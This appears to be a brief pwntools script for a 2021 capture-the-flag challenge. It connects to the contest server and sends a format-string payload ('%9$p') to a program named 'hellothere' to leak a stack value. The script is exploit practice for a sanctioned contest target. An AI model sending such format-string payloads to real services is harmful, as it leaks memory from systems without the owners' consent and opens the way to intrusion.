from pwn import *

io = remote('pwn-2021.duc.tf', 31918)
#io = process('./hellothere')

payload = '%9$p'

print(io.recv())
io.sendline(payload)
print(io.recvuntil(b'Hello there, '))
print(io.recvline())
